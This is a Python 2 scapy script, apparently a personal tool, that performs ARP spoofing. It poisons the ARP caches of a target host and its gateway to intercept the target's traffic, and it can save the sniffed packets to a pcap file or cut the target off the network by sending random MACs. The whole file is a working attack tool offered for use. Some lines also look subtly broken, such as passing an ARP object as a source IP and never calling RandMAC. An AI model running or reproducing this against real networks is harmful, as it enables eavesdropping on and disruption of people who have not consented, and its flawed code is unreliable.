#!/usr/bin/env python
from scapy.all import *
import os
import sys
import threading
import argparse
import time

DESCRIPTION = """Arpspoof.py, a tool to do arp spoofing attack."""
parser = argparse.ArgumentParser(description=DESCRIPTION)
parser.add_argument("target", nargs="?", type=str, help="Host to do arp spoofing")
parser.add_argument("gateway", nargs="?", type=str, help="Gatway to do arp spoofing, default is 192.168.1.1")
parser.add_argument("-p", "--packets", type=int, help="Packets to sniffer")
parser.add_argument("-f", "--file", type=str, help="File to restore(pcap)")
parser.add_argument("-i", "--interface", type=str, help="Interface to capture packets")
parser.add_argument("-F", "--filter", type=str, help="BPF to filter packets")
parser.add_argument("-r", "--recover", dest="recover", action="store_true", help="Recover target's arp table")
parser.add_argument("-s", "--sniff", dest="sniff", action="store_true", help="Sniffer after arp spoofing")
parser.add_argument("-u", "--unable-network", dest="unable", action="store_true", help="Unable target's network")

parser.set_defaults(gateway="192.168.1.1")
parser.set_defaults(packets=1000)
parser.set_defaults(file="sniffer.pcap")
parser.set_defaults(interface="enp0s3")
parser.set_defaults(sniff=False)
parser.set_defaults(recover=False)
parser.set_defaults(unable=False)

args = parser.parse_args()

if args.target is None:
    print "[-] Need to set target"
    sys.exit(1)

global interface
global PACKET_COUNT
global BPF
global pcap

interface = args.interface
PACKET_COUNT = args.packets
targetIP = args.target
gatewayIP = args.gateway
pcap = args.file
BPF = args.filter if args.filter is not None else "ip host %s" % targetIP

# set scapy
conf.iface = interface
conf.verb  = 0

# set ip forward
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

print "[+] Using network interface %s" % interface

def get_mac(ip):
    response, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                            timeout=2,
                            retry=10)

    for s,r in response:
        return r[Ether].src

    return None

def check_mac(ip, mac, target=""):
    if mac is None:
        print "[-] Get %s:%s Mac fail." % (target, ip)
        print "[-] exit."
        sys.exit(1)
    else:
        print "[+] Get %s:%s Mac:%s." % (target, ip, mac)

def generateARP(targetIP, targetMac, gatewayIP, gatewayMac):
    target = ARP()
    target.op = 2
    target.psrc = gatewayIP
    target.pdst = targetIP
    target.hwdst = targetMac if not args.unable else RandMAC
    
    gateway = ARP()
    gateway.op = 2
    gateway.psrc = target
    gateway.pdst = gatewayIP
    gateway.hwdst = gatewayMac if not args.unable else RandMAC

    return (target, gateway)

def spoof(target, gateway):
    print "[+] Start arpspoofing"
    print "[+] Target: %s" % target.pdst
    print "[+] Gatway: %s" % gateway.pdst
    print "[+] Enter [Ctrl + C] to stop"

    while True:
        try:
            send(target)
            send(gateway)
            time.sleep(3)
        except KeyboardInterrupt:
            print "[+] Stop arpspoofing"
        except:
            continue

    print "[+] Finish arpspoofing"
    return

def sniffer(ip):
    global interface
    global PACKET_COUNT
    global pcap
    global BPF
    try:
        print "[+] Start sniff %s" % ip
        packets = sniff(count=PACKET_COUNT, filter=BPF, iface=interface)
        wrpcap(pcap, packets)

    except KeyboardInterrupt:
        pass

def recover(targetIP, targetMac, gatewayIP, gatewayMac):
    print "[+] Recover arp table"
    send(ARP(op=2, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=gatewayMac), count=5)
    send(ARP(op=2, psrc=targetIP, hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=targetMac), count=5)

gatewayMac = get_mac(gatewayIP)
check_mac(gatewayIP, gatewayMac, "gateway")
targetMac = get_mac(targetIP)
check_mac(targetIP, targetMac, "target")
target, gateway = generateARP(targetIP, targetMac, gatewayIP, gatewayMac)

spoof_thread = threading.Thread(target=spoof,
                args=(target, gateway))
spoof_thread.start()
if args.sniff:
    sniffer(targetIP)

if args.recover:
    recover(targetIP, targetMac, gatewayIP, gatewayMac)
